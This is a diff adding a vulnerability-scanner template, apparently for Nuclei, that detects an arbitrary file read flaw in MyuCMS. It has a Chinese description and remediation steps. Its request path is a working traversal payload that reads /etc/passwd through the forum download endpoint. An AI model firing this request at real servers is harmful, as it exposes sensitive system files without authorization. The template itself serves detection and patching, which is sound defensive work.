@@ -1,0 +1,32 @@
+id: myucms-lfr
+info:
+  name: MyuCMS Local File Read
+  author:
+  - l0ne1y
+  tags:
+  - myucms
+  - lfi
+  description: |-
+    MyuCMS存在任意文件读取漏洞
+    MyuCMS前端前台采用UIkit框架，后台采用layui后台框架，后端采用PHP+MYSQL开发而成。MyuCMS存在任意文件读取漏洞，攻击者可利用漏洞获取敏感信息。
+  reference:
+  - https://blog.csdn.net/yalecaltech/article/details/104908257
+  severity: high
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：http://www.myucms.com
+
+    临时修复方案：
+    1、过滤\".\"，使用户在url中不能回溯上级目录。
+    2、正则匹配严格判断用户输入参数的格式，对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。
+    3、禁止系统提供目录遍历服务，如：php.ini配置open_basedir限定文件访问范围。
+    4、文件路径保存至数据库，让用户提交文件对应ID下载文件。
+    5、用户下载文件之前进行权限校验。
+requests:
+- matchers:
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+  path:
+  - '{{BaseURL}}/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1'
+  method: GET
